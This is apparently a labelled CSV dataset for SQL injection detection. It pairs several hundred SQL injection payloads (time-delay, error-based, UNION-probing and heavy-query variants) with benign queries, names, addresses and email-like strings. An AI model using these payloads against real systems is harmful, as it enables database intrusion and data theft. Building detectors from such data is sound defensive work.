Query,Label
"1  )   where 5012  =  5012   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
SELECT TOP 50 PERCENT * FROM wagon,0
SELECT * FROM setting WHERE hearing BETWEEN angry09/01/1996pay AND such15/31/1996cold,0
1'  )   where 5145  =  5145,1
DELETE FROM grandmother,0
6267,0
"1'   )    )    as cbka where 3176  =  3176 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM include WHERE strip = 'eager'  AND  ( flat = 'positive' OR fighting = 'drop' ) ,0
cu2tre8a,0
almoharn,0
baxie,0
18684547z,0
1' where 4473  =  4473 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
vieites kerber,0
senderow,0
SELECT AVG ( slowly ) FROM addition,0
FROM  ( SELECT DISTINCT down FROM far ) ,0
" SELECT * FROM brave ORDER BY detail ASC, wish DESC",0
cebuano,0
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",1
SELECT TOP 3 * FROM tape WHERE earlier = 'told' SELECT * FROM behind,0
"1""  )   as piwi where 2918  =  2918",1
FROM  ( SELECT DISTINCT select FROM airplane ) ,0
SELECT * FROM proper WHERE    NOT built = 'well',0
9.03287E+15,0
"1'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
laycock_faulds@peaf.sd,0
"1%""   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"   SELECT COUNT ( select ) , easy FROM satellites BY gray",0
calle villa de andorra 36 9?b,0
laga_rtijo,0
3.32981E+15,0
cartaa,0
SELECT * FROM locate WHERE school = 'engineer' LIMIT 3,0
6208,0
"segura 30,",0
38350,0
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qfvg'  =  'qfvg",1
"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"   SELECT visit, extra, principleFROM lesson WHERE better  IS NOT NULL",0
6196,0
sugesto,0
"   SELECT couple, moment, veryFROM bean WHERE outside  IS NOT NULL",0
SELECT * FROM rhyme WHERE slipped = 'lucky' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM swing WHERE explain BETWEEN '1996-07-01' AND '1996-07-31',0
ares,0
"1""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  ""staz"" like ""staz",1
"1'  )   as yuqv where 6007  =  6007 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
"calle valencia de don juan 161, 7?d",0
SELECT AVG ( shown ) FROM attack SELECT SUM ( change ) ,0
SELECT * FROM instead WHERE solar LIKE '%create%',0
"1"" and sleep  (  5  )  ",1
"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dqis""  =  ""dqis",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 9081 )  ORDER BY meta_id ASC",0
"  SELECT sport AS lie, kind AS [canal]  FROM current",0
1'  )   as eyzk where 2489  =  2489 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"  SELECT * FROM farm WHERE weight IN  ( 'own', 'herd', 'rabbit' )  ",0
" SELECT * FROM whom ORDER BY clearly, element",0
"c/ cardenal cisneros 58,",0
"1""  )   as ronb where 9368  =  9368",1
"1   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6265  =  6265",1
5900,0
"1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  3124  =  3124,1
SELECT * FROM social WHERE headed NOT BETWEEN 'failed' AND 'clothing',0
"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",1
SELECT AVG ( practical ) FROM brother SELECT SUM ( yes ) ,0
"  SELECT Orders.shadowrID, Employees.becoming, Employees.please FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.seeID ORDER BY Orders.nestID",0
79533872x,0
SELECT * FROM  ( SELECT proper FROM becoming ) ,0
"1' where 1673  =  1673 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1""   )    )    union all select null,null,null,null,null#",1
SELECT * FROM sunlight WHERE tired = 'coming'  AND City = 'watch',0
"pealara, 87",0
SELECT * FROM salmon WHERE act = 'glad',0
"-7656""   )    )     )   union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",1
SELECT TOP 3 * FROM amount,0
"1""  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  ""zyeo"" like ""zyeo",1
1  )   where 6494  =  6494,1
"1""   )    )    as swwb where 4244  =  4244",1
" SELECT * FROM eat ORDER BY forest, alone",0
"-4679 where 9634  =  9634 union all select 9634,9634,9634,9634,9634,9634,9634--",1
SELECT * FROM church WHERE captured NOT BETWEEN 'invented' AND 'fifty',0
"SELECT DATE_SUB ( ""2017-06-15"", INTERVAL -2 MONTH ) ;",0
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv",1
SELECT * FROM over WHERE market BETWEEN 'exact' AND 'specific',0
SELECT * FROM collect,0
"waitfor delay '0:0:5' and    (    (   ""%""  =  """,1
SELECT TOP 50 PERCENT * FROM finger,0
-4239 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,1
1'   )    )    as bswc where 1635  =  1635 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"  SELECT * FROM twenty WHERE court NOT IN  ( 'yesterday', 'blind', 'evidence' )  ",0
SELECT * FROM glass,0
"   SELECT Employees.drawn, COUNT ( Orders.drivingID )  AS beenFROM    ( OrdersINNER JOIN with ON Orders.brainID  =  Employees.communityID ) ",0
SELECT COUNT ( add ) FROM pure,0
"1"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1
"1%'   )    )     )   union all select null,null,null,null--",1
08zaril0o,0
16124624z,0
"1%'   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT * FROM island WHERE get BETWEEN '1996-07-01' AND '1996-07-31',0
"1   )    )    as tuxy where 6855  =  6855 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
SELECT everybody ( s )  FROM spell FULL OUTER JOIN,0
 UPDATE grain SET bark = 'tower'WHERE easier = 'coast',0
"c/ corint, 13 11?a",0
3.62194E+15,0
SELECT * FROM wing WHERE sound = 'depth'  OR body = 'raw',0
SELECT * FROM announced,0
admin'  )   or '1'  =  '1'/*,1
"1""  )   where 5870  =  5870 union all select null,null,null--",1
estanislao,0
end and    (    (   'zlsq'  =  'zlsq,1
SELECT TOP 3 * FROM waste,0
"1""   )    )    union all select null,null--",1
" select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",1
1'  )   as lewd where 3118  =  3118 order by 1--,1
SELECT MIN ( iron )  AS mysterious FROM thick,0
forsyne@velaconsultores.mx,0
salina-sonajew@almeriastella.vg,0
SELECT * FROM wealth 3 SELECT * FROM mail,0
"  SELECT repeat,such,divide FROM stood LEFT JOIN Orders ON outer.pairID =  method.strength ORDER BY race.voice",0
"1""   )    )    as tljw where 8474  =  8474 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
SELECT TOP 3 * FROM separate WHERE discover = 'solution' SELECT * FROM income,0
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1
3500,0
batallanos halpin,0
ozselcuk,0
aulakh,0
SELECT MIN ( interest )  AS flat FROM planet,0
1' where 5819  =  5819 and   (  1275  =  4759  )  *4759--,1
1.1363E+15,0
garzon6@mtos.ro,0
"1%""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""%""  =  """,1
SELECT * FROM may WHERE try = 'finest',0
18567,0
"-6086"" union all select 8700,8700,8700,8700--",1
SELECT * FROM  ( SELECT mistake FROM addition ) ,0
4.97885E+15,0
SELECT * FROM  ( SELECT girl FROM improve ) ,0
SELECT * FROM brother WHERE dirty = 'apple' LIMIT 3,0
pridiliano,0
SELECT COUNT ( youthID ) FROM greatest,0
SELECT TOP 50 PERCENT * FROM wet SELECT * FROM inch FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wild,0
SELECT COUNT ( beauty ) FROM per,0
SELECT option_value FROM wp_options WHERE option_name  =  'kc_active_extensions' LIMIT 1,0
SELECT * FROM clear 3,0
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1
"  SELECT rateID AS ID, avoid AS recall FROM rice",0
"  SELECT crowd AS struck, fly AS [smooth]  FROM continued",0
"1'+  (  select 'zkuf' where 3591  =  3591 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
SELECT * FROM bag 3 SELECT * FROM except,0
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
SELECT * FROM salt WHERE flower = 'occasionally'  OR same = 'crack',0
"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",1
1 where 2672  =  2672 and 1819  =  4322#,1
SELECT COUNT ( fliesID ) FROM clock,0
SELECT object FROM important,0
mendie,0
"1%""  )   rlike sleep  (  5  )  #",1
"1""  )   and 8677  =  9054#",1
SELECT * FROM sky WHERE bar IN  ( SELECT asleep FROM balloon ) ,0
FROM  ( SELECT DISTINCT struggle FROM church ) ,0
28614822q,0
SELECT DAYOFWEEK ( CURDATE (   )  )  ;,0
SELECT * FROM dig WHERE proud BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM think WHERE property BETWEEN kill09/01/1996flag AND yourself15/31/1996love,0
25938703q,0
1'+  (  select 'vtyw' where 7950  =  7950 order by 1--,1
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",1
SELECT TOP 3 * FROM only SELECT * FROM breathe 3SELECT * FROM wide,0
SELECT steady ( s )  FROM felt LEFT JOIN,0
SELECT * FROM street 3,0
"1' union all select null,null#",1
-1564'  )   order by 1--,1
SELECT blind FROM egg UNION ALL SELECT half FROM closer ORDER BY sheet,0
"INSERT INTO lying  ( border, vast, tune )  VALUES  ( 'longer', 'movement', 'dirt' )  ",0
fililberto,0
SELECT * FROM mean WHERE gentle BETWEEN 'thy' AND 'green',0
SELECT TOP 50 PERCENT * FROM area SELECT * FROM wise FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM throat,0
"  SELECT TIME_TO_SEC ( ""03:30:00.999999"" ) ;",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 185 )  ORDER BY meta_id ASC",0
"1""  )   as advz where 5166  =  5166 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
16813,0
trissenaar@tetdevelocidad.uk,0
calle carlos arniches 173,0
"1""  )   where 9680  =  9680 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
16856,0
SELECT AVG ( package ) FROM queen SELECT SUM ( ran ) ,0
9.15202E+15,0
02906029w,0
"calle tiberiades, 90, 8-f",0
SELECT * FROM instant WHERE noise = 'numeral' FETCH FIRST 3 ROWS ONLY,0
granfiel,0
SELECT * FROM against ORDER BY sky DESC,0
SELECT * FROM dog WHERE gulf BETWEEN '1996-07-01' AND '1996-07-31',0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",1
"1'+  (  select xlvq where 7470  =  7470 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   +'",1
SELECT MIN ( recent )  AS bring FROM sense,0
SELECT * FROM progress WHERE pilot = 'chain'  AND  ( mountain = 'involved' OR meal = 'went' ) ,0
callejon san felices 187,0
SELECT * FROM completely FETCH FIRST 3 ROWS ONLY,0
select   (  case when   (  3365  =  6236  )   then 3365 else 1/  (  select 0  )   end  )  --,1
SELECT AVG ( Price ) FROM detail,0
SELECT COUNT ( seedID ) FROM return,0
SELECT * FROM  ( SELECT shallow FROM drive ) ,0
5.66E+15,0
FROM  ( SELECT DISTINCT band FROM page ) ,0
SELECT safety FROM grow UNION SELECT tales FROM deal ORDER BY thank,0
SELECT TOP 3 * FROM drink WHERE house = 'rear' SELECT * FROM himself,0
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",1
SELECT * FROM folks WHERE concerned = 'art' LIMIT 3,0
"INSERT INTO child  ( any, pony, experiment )  VALUES  ( 'produce', 'difficult', 'helpful' )  ",0
thibaut,0
SELECT COUNT ( correct ) FROM form,0
"-8448%"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1
SELECT COUNT ( improve )  FROM laugh,0
-2784  )   where 5261  =  5261 or 3472  =  1728#,1
20001,0
"  SELECT City, Country FROM SuppliersWHERE Country = 'Germany'ORDER BY City;  SELECT 'Customer' AS Type, ContactName, City, Country",0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  # bkjl,1
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'eovg' like 'eovg",1
"  SELECT bad,raw FROM spread WHERE current = 'thank' UNION SELECT subject, grow FROM parts",0
alfa71ta,0
gregescos,0
aguacella,0
select   (  case when   (  7822  =  4430  )   then 7822 else 1/  (  select 0  )   end  )  --,1
"1  )   as khkv where 2944  =  2944 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
19332,0
SELECT religious FROM wish UNION ALL SELECT constantly FROM blood ORDER BY slope,0
"-4513""   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  ""gytb""  =  ""gytb",1
69634179t,0
san perfecto 8,0
"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",1
SELECT * FROM  ( SELECT bell FROM shoot ) ,0
SELECT TOP 50 PERCENT * FROM kept,0
-9739' or 8571  =  8571--,1
1  )   where 5442  =  5442,1
"1%'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
woolgar@awat.gov,0
1' where 8099  =  8099,1
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu",1
"pont de bar, el",0
SELECT * FROM upper WHERE seat LIKE '%ice%',0
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'xdfz'  =  'xdfz",1
SELECT * FROM [Products Above Average Price]; CREATE OR REPLACE VIEW view_name AS,0
"c/ general merry del val, s/n",0
SELECT * FROM recall WHERE motor = 'officer' FETCH FIRST 3 ROWS ONLY,0
"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM instance WHERE planet  BETWEEN 10 AND 20,0
sureda bahamonde,0
SELECT COUNT ( tightID ) FROM noted,0
"-1275"" union all select 7861,7861,7861,7861,7861#",1
claudino,0
"  SELECT circle,father,us FROM avoid LEFT JOIN Orders ON different.representID =  spoken.putting ORDER BY chance.rice",0
muopedro,0
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ccqs'  =  'ccqs",1
